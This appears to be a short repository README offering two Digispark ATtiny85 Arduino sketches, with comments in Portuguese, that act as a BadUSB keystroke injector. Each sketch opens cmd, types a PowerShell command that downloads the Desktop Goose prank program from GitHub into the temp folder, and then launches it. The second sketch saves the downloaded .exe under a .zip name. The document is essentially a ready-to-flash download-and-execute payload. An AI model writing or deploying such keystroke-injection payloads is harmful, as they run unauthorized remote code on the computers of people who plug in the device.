# Desktop-Goose
LINK

Arduino IDE (Digispark ATINY85)
Link ZIP:

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Inicializa
  DigiKeyboard.delay(1000);

  // Abre o Executar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Digita "cmd" e aperta Enter
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Comando para baixar Desktop Goose
  DigiKeyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/MrNuno/Desktop-Goose/raw/refs/heads/main/Desktop%20Goose%20v0.31.zip' -OutFile $env:TEMP\\goose.zip\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // espera baixar (pode aumentar se a net for lenta)

  // Abre o arquivo baixado
  DigiKeyboard.print("start $env:TEMP\\goose.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Não precisa repetir
}


Link EXE:

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Inicializa
  DigiKeyboard.delay(1000);

  // Abre o Executar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Digita "cmd" e aperta Enter
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Comando para baixar Desktop Goose
  DigiKeyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/MrNuno/Desktop-Goose/raw/refs/heads/main/GooseDesktop.exe' -OutFile $env:TEMP\\goose.zip\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // espera baixar (pode aumentar se a net for lenta)

  // Abre o arquivo baixado
  DigiKeyboard.print("start $env:TEMP\\goose.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Não precisa repetir
}


